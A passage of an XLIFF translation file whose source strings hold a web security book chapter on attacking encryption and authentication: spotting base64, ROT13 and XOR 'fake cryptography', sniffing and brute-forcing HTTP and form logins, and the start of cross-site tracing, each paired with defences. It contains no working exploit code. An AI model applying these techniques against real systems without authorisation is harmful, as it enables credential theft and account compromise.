        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>We've made the point over and over in this book: The Web is different. The differences between Web applications and normal applications are many, but some specific differences create the need for more carefully crafted authentication and encryption mechanisms.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Consider the following:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;The Web is anonymous&amp;mdash;&lt;/span&gt; Web applications never really know who they are talking to and must take great pains to authenticate users to prevent identity theft and fraud.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;The Web is open&amp;mdash;&lt;/span&gt; Communication protocols between the client and the server are well-documented, and the idea of some third party intercepting such a transmission and tampering with its contents is an established reality.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In other words, our Web application doesn't know who it is talking to or whether what is said is authentic.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This chapter is about attacks against this authenticity and what Web developers can do about it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 21 Fake Cryptography</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The act of encrypting messages so that only the intended recipient can read them goes all the way back to the Roman Empire. Apparently, keeping secrets has been popular for a long time! For our purpose of secure Web communication, secrecy is a good thing, because encrypting Web traffic is an important part of overall Web application security.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One of the most basic methods of encrypting a message is the so-called &lt;span class="docEmphStrong"&gt;substitution cipher&lt;/span&gt; in which each character in the message is replaced with another. For example, A becomes G, B becomes W, C becomes I, and so forth. The technique is also known as the &lt;span class="docEmphStrong"&gt;Caesar cipher&lt;/span&gt; in deference to the roots of cryptography in ancient Rome. We've come a long way from these simplistic cryptographic methods to arguably one of the most important mathematics/computer science crossovers: public key cryptography. However, despite the ready availability of provably secure cryptographic routines, Web programmers continue to &amp;quot;roll their own&amp;quot; cryptography or choose existing systems that are too easily broken.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Before we take a look at this, though, let's discuss the reasons we may want to use a form of cryptography in a Web application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When we think about security, we are trying to achieve three basic needs:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Confidentiality&amp;mdash;&lt;/span&gt; Only the intended recipient can receive and read a message.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Integrity&amp;mdash;&lt;/span&gt; The message that the recipient is reading is the exact message that was sent; that is, no one altered the message.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>&lt;span class="docEmphStrong"&gt;Availability&amp;mdash;&lt;/span&gt; The system that is tasked with providing such assurances is robust enough not to go down.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first letters of these three needs form the easily remembered acronym CIA.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Cryptography can't help with availability, but it can help with confidentiality and integrity. Thus, cryptography protects us as long as the strength of the encryption algorithm is adequate for the data it has to protect.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, programmers often &lt;span class="docEmphasis"&gt;do not&lt;/span&gt; use encryption methods that are strong enough for the data they are trying to protect. Sometimes they favor writing their own algorithms over using ones that have been proven to be secure. They get away with this because in casual inspections, the</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>encrypted data looks random enough that the cipher technique seems unbreakable, but roll-your-own cryptography rarely stands up to serious attack, and the process of breaking weak ciphers is highly automatable.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack applies whenever there is data (either stored in a database or traveling over the network) that represents some advantage to an attacker. Generally this is privacy information, credit card information, or other information that should not be generally available to a casual observer and should be encrypted. Not all applications use encryption, but some are mandated under various polices, like storage of credit card numbers under the Payment Card Industry's Data Security Standard.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Looking at a sitemap (see &lt;a class="docLink" href="ch02.html#ch02"&gt;Chapter 2&lt;/a&gt;, &amp;quot;Gathering Information on the Target&amp;quot;) and inspecting CGI parameters may uncover encrypted data. However, in many applications, cryptography is used to protect data at rest (data stored in a database), and alternative methods are used to protect data in transit. (See &amp;quot;&lt;a class="docLink" href="#ch08lev2sec2"&gt;Attack 22&amp;mdash;Forcing Weak Cryptography&lt;/a&gt;,&amp;quot; later in this chapter.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If you're able to view encrypted data while traveling over clear HyperText Transfer Protocol (HTTP), check for client-side code in scripts or applets that you can view or decompile to find the algorithm in use, and attempt to discover cryptographic methods that the server is employing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's difficult to look at encrypted parameters, which appear in a Universal Resource Locator (URL) as random strings of characters, and deduce what encryption scheme is being used. However, if you have some control over the data that is being encrypted, you can use certain techniques to determine whether strong or weak cryptography is in place.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>First, try variable-length strings and look for equal signs (&lt;tt&gt;=&lt;/tt&gt;) at the end. If equal signs are present, it's likely that base64 encoding is being used to &amp;quot;hide&amp;quot; the data. Base64 encoding pads missing bytes with equal signs. When those signs appear at the end of an encrypted string, you should be suspicious.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Let's look at an example and take a subset of a common pangram, the quick brown fox. Encoding this in base64 gives us the following string:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>dGhlIHF1aWNrIGJyb3duIGZveA==</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The double equal sign at the end is a good indication that the string is base64 encoded. Let's add the next character, a space, to the string:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>dGhlIHF1aWNrIGJyb3duIGZveCA=</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The string changes minimally, and we still have a single equal sign padding the output to the required number of bytes. Adding another character (the &lt;tt&gt;j&lt;/tt&gt;) gives us this encoded string:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>dGhlIHF1aWNrIGJyb3duIGZveCBq</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because the string is now a multiple of 3 bytes, there's no need to pad the output with equal signs. The other indication that a string may be base64 encoded is the characters that make up the string. Only letters (upper and lower) and numbers can be in the output, with zero, one, or two equal signs at the end. See &lt;a class="docLink" target="_blank" href="http://email.about.com/cs/standards/a/base64_encoding.htm"&gt;http://email.about.com/cs/standards/a/base64_encoding.htm&lt;/a&gt; for an in-depth example of how base64 encoding operates.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another technique is to take a single character from an unencrypted string and increment it by changing it to its next sequential value; that is, change A to B, or E to F. After you re-encrypt the string, compare it to the original encrypted string before you made the change. If the strings differ only in a single location, then some type of substitution cipher may be in use. Attackers who have no control over the message can break this encryption method by using &lt;span class="docEmphStrong"&gt;frequency analysis&lt;/span&gt;, where the statistical likelihood of how often a character appears in a normal sentence is used as a foothold in guessing the encryption key.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The simplest and most commonly available substitution cipher is &lt;span class="docEmphStrong"&gt;ROT13&lt;/span&gt;. In that system, you take a character and move forward in the alphabet 13 places (wrapping at the end of the alphabet). For example, A becomes N, and P becomes C. Using ROT13 on our &lt;tt&gt;the quick brown fox&lt;/tt&gt; string gives us the following output:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>gur dhvpx oebja sbk</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One of the first giveaways of this &amp;quot;encryption&amp;quot; scheme&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch08fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; is that spaces are preserved. (Numbers are, too. The ROT47 scheme, in contrast, uses the full ASCII character set.) Also, as discussed earlier, changing one letter only changes a similar letter in the output:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch08fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; ROT13 was only designed to mask text in Usenet postings so as not to give away &amp;quot;spoilers&amp;quot; in books, films, and so on. It was never designed to protect data.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>the quick brown fox &lt;img src="U2192.GIF" border="0" /&gt; gur dhvpx oebja sbk
tha quick brown fox &lt;img src="U2192.GIF" border="0" /&gt; gun dhvpx oebja sbk</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For most &amp;quot;fake&amp;quot; encryption schemes, this technique holds true and can be used in breaking the cipher. A single change in the input results in a single change in the output. As a counter example, here are the same changes using the blowfish encryption scheme (with &lt;tt&gt;mike&lt;/tt&gt; as the passphrase).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>the quick brown fox &lt;img src="U2192.GIF" border="0" /&gt; D695448D3D0D93FD
tha quick brown fox &lt;img src="U2192.GIF" border="0" /&gt; 48FA14E34C3D00DA</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finally, some roll-your-own encryption schemes use the exclusive &lt;tt&gt;OR&lt;/tt&gt; operator&amp;mdash;&lt;tt&gt;XOR&lt;/tt&gt;&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch08fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt;&amp;mdash;to combine the message string with a secret or key string. If this key string is as long as the message, it becomes practically impossible to break&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch08fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; (which is effectively how RC4 works&amp;mdash;&lt;a class="docLink" target="_blank" href="http://en.wikipedia.org/wiki/Rc4"&gt;http://en.wikipedia.org/wiki/Rc4&lt;/a&gt;). However, then you have the problem of transferring the key strings so that someone can decrypt the message when he receives it. This is effectively the same problem as transferring the message. Now you have the additional problem of hiding the key string from an attacker. However, if a limited-length key string is used repeatedly over the message, it is likely that a skilled attacker can decrypt it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch08fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; The &lt;tt&gt;XOR&lt;/tt&gt; operation is much like the &lt;tt&gt;OR&lt;/tt&gt; operator, but where both operands are &lt;tt&gt;TRue&lt;/tt&gt;, the result is &lt;tt&gt;false&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>x</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>y</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>x &lt;tt&gt;XOR&lt;/tt&gt; y</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>1</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>1</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>1</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>1</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>1</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>1</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.table.tr.td.p.text">
          <source>0</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch08fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; Additionally, if the key is used only once (and it is completely random&amp;mdash;known as a &lt;span class="docEmphStrong"&gt;one-time pad&lt;/span&gt;), this turns out to be the only encryption scheme that remains secure in the face of unlimited computation.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>That's because &lt;tt&gt;XOR&lt;/tt&gt; is a transitive operation. It gives the same value regardless of which direction it is called&amp;mdash;much the same as addition or multiplication. If we have plain text and run it through &lt;tt&gt;XOR&lt;/tt&gt; encryption with a particular key, we get an encrypted message. In the reverse direction, if we take an encrypted message and run it though &lt;tt&gt;XOR&lt;/tt&gt; with the same key we get the plain text. However, there's another operation. If we know the plain text, and we have the encrypted message, running them through &lt;tt&gt;XOR&lt;/tt&gt; gives us the key, as in the following example:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>Input  &lt;img src="U2192.GIF" border="0" /&gt; 11001100
Key    &lt;img src="U2192.GIF" border="0" /&gt; 10101010
Output &lt;img src="U2192.GIF" border="0" /&gt; 01100110</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Take the output and &lt;tt&gt;XOR&lt;/tt&gt; it with the input. Out pops the key:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>Output &lt;img src="U2192.GIF" border="0" /&gt; 01100110
Input  &lt;img src="U2192.GIF" border="0" /&gt; 11001100
Key    &lt;img src="U2192.GIF" border="0" /&gt; 10101010</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This may sound impractical (how would attackers know what the plain text was), but with certain parameters such as first names, social security numbers, and telephone numbers, there's a limited set of possibilities, and it's computationally inexpensive to try all the possibilities in these short ranges and extract the key.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The &lt;tt&gt;xor-analyze-0.1.tar&lt;/tt&gt; archive on this book's CD contains tools to help break these encryption methods using various statistical analysis methods.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Like so many of the mitigations that we have presented, protecting against this attack is simple. Programmers should be able to recognize when cryptography is necessary and use known algorithms that are already acknowledged as being secure by open review from the computing community. Avoid unknown, just invented, or new algorithms in preference of ones such as RSA, Triple DES, and AES to name but a few.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 22 Breaking Authentication</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In the early days of HTTP, all requests for resources were serviced (if the resource was accessible), or an error message was returned saying that the resource could not be found. Information was free to anyone who knew where it was stored. Obviously, times have changed. Restricted content is now regularly traded over the Internet. Access restrictions are now responsible for ensuring that only those people who can prove they have the required permissions can access certain resources.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Initially, these access restrictions were left up to the internal mechanisms of the operating system. However, this method that worked well on small local-area networks didn't scale well to the open Web. History is replete with Web applications granting all manner of users login privileges to remote systems and their resources. What was needed was a way of restricting access to resources independent of operation system user identification mechanisms.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Enter HTTP authentication.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>HTTP authentication exists in two flavors: basic and digest. Both use a single file containing usernames and passwords (often identified in UNIX as the .&lt;tt&gt;htaccess&lt;/tt&gt; file), but they differ in how users' credentials are transmitted to the server for verification of access rights.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When a user requests a restricted file, the server responds with an HTTP 401 error (authorization required) as in &lt;a class="docLink" href="#ch08fig01"&gt;Figure 8-1&lt;/a&gt;. When receiving this response, the browser pops up a window for the user to enter his username and password. In HTTP basic authentication, these inputs are concatenated together with a colon separating them. Then they're base64 encoded. The request is resent, but this time with an &lt;tt&gt;Authentication: Basic&lt;/tt&gt; header followed by the base64 encoded &lt;tt&gt;username:password&lt;/tt&gt; string as in &lt;a class="docLink" href="#ch08fig02"&gt;Figure 8-2&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-1. Request for a protected resource.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-2. Re-request after you've supplied credentials. Note the decoded authorization string.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Simply base64 encoding a username and password does not protect it, as we discussed in the previous attack. An attacker can sniff and capture the authentication traffic and easily decode the string containing the credentials. HTTP digest authentication overcomes this by not actually sending the username and password to the server, but sending a hash (in this case an MD5 hash) of the string instead. Therefore, even if an attacker manages to capture the authentication traffic, the username and password are not immediately obvious.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>On its own, digest improves over basic authentication because it does not send a password. However, as currently described, an attacker can replay a captured authentication request by capturing the traffic for a valid login and resending to the same server. To mitigate against this, the server sends a &lt;span class="docEmphStrong"&gt;nonce&lt;/span&gt;&amp;mdash;a single use value&amp;mdash;and adds it to the hash of credentials. Because the server expires each nonce after it has been used (or after an expiration period), you cannot replay a captured authentication request.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>After a successful authentication has occurred, the browser automatically caches and retransmits the authorization header for future requests. If too many incorrect authentication attempts have been made, the server responds with a 403 error indicating that the request has been denied. However, one of the flaws with HTTP authentication, as we've learned before, is that HTTP is stateless. You can simply ignore the error message and try again. This is the behavior we will be exploiting in this attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Be aware, though, that it is becoming increasingly common for developers to build their own method of authentication into their Web applications by gathering user credentials via forms and passing them off to be validated on the server by matching the credentials to existing users in a database. This naturally goes by the name of &lt;span class="docEmphStrong"&gt;form-based authentication&lt;/span&gt;, but often it is susceptible to the same problems as HTTP authentication and is a target for this attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Following the method of the previous attack, walk the application and note authentication points. The obvious place to start is the initial login screens, but don't overlook other sections of the Web application that might enforce different access requirements, such as administrative pages. Knowing these places gives us targeted locations to attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The next thing to look for is the strength of the required credentials. Weak methods won't enforce passwords that have length and content (special characters, a mix of upper- and lowercase letters, numbers, and so forth) restrictions. If usernames and passwords have complexity requirements that force combinations of letter, number, and punctuation characters, brute-forcing through an authentication point is likely a considerable effort that is not worth your time. Also, if a valid login is available, check to see if the username and password are case sensitive. They should be. If they are not, it significantly reduces the complexity of brute-forcing the password.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Finally, look at the transport mechanism used in passing the credentials to the server. If it is over HTTPS, there may be no opportunity to password-sniff (except by forcing weak cryptography, which we will discuss next).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Start by looking at password disclosure and replay. Check that authentication within the application is performed over a secure connection. If it's not, attackers may be able to sniff the password from the network traffic and either decode it to discover usernames and passwords (as in the case of basic authentication) or replay the captured request (as in the case of form-based or digest authentication without a nonce).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When it comes to using a brute-force method of breaking authentication schemes, the complexity of usernames and passwords is always the prime factor. Sitting and manually typing requests is clearly an irrational approach. That's why using a tool like Brutus (shown in &lt;a class="docLink" href="#ch08fig03"&gt;Figure 8-3&lt;/a&gt; and described in &lt;a class="docLink" href="app03.html#app03"&gt;Appendix C&lt;/a&gt;, &amp;quot;Tools&amp;quot;) makes this type of testing manageable both for us and for the attackers!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-3. Brutus&amp;mdash;a tool for brute-forcing authentication.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Ensuring that all authentication occurs over a secure connection provides the best protection against replay attacks. Although all three methods&amp;mdash;basic, &lt;a name="iddle1103"&gt;&lt;/a&gt;digest, and form-based authentication&amp;mdash;have various weaknesses, the encrypted network traffic of HTTPS provides protection against login credentials being disclosed for later decryption/analysis or for reuse.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Protecting from brute-force attacks can involve a variety of methods. The first should be requiring that users have complex usernames and passwords. Policies on these vary from company to company, but generally passwords that are more than seven characters in length and have a combination of upper- and lowercase letters, numbers, and punctuation make stronger passwords. Tour your competitors' sites and other places on the Web to get an idea of what they're using.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Brute-forcing passwords is an action of automation. The CAPTCHA technology (&lt;a class="docLink" target="_blank" href="http://www.captcha.net/"&gt;http://www.captcha.net/&lt;/a&gt;) attempts to prevent this by using a test that a human can easily pass, but automation cannot. The most commonly used example is deformed text, as &lt;a class="docLink" href="#ch08fig04"&gt;Figure 8-4&lt;/a&gt; shows. This is obviously NSF to us, but a computer can't read it.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-4. Example of deformed text used in CAPTCHA.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>You can use this approach not only to overcome brute-force tools, but also to protect against large volume information gathering (for example, database scraping) or subverting business processes (for example, high volume signing up for free resources or submitting ticket requests). Unfortunately, security is somewhat of an arms race with attackers. Already, techniques are available to defeat CAPTCHA by including optical character recognition (OCR) technology or caching solutions for known CAPTCHA images (although this is more of a flaw in the implementation of CAPTCHA than the mechanism itself). Be alert, and stay current.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When you use form-based authentication, you should lock accounts for varied periods of time when someone tries several incorrect attempts. This gives the attacker limited time to attempt to brute-force an account password. Depending on the amount of time that accounts are locked out, a new attack might result&amp;mdash;a denial of service against the application by systematically brute-forcing all valid accounts so that every legitimate user is denied access.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 23 Cross-Site Tracing</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In January 2003, a new Web-based vulnerability was thrust into the world. In researching methods to bypass Microsoft's HTTP-only cookie attribute that was introduced to help mitigate session hijacking attacks via cross-site scripting (XSS), WhiteHat Security discovered another approach to getting information from cookies and HTTP authentication information. Many in the security community felt the new vulnerability called &lt;span class="docEmphStrong"&gt;cross-site tracing&lt;/span&gt; was over-hyped, but it is an interesting attack that contains an important lesson. The lesson is that security is a factor of the sum of all systems, not just individual system security.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One of the available HTTP methods is TRACE. It is used in &lt;a class="docLink" href="#ch08fig05"&gt;Figure 8-5&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 8-5. An HTTP TRACE example.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
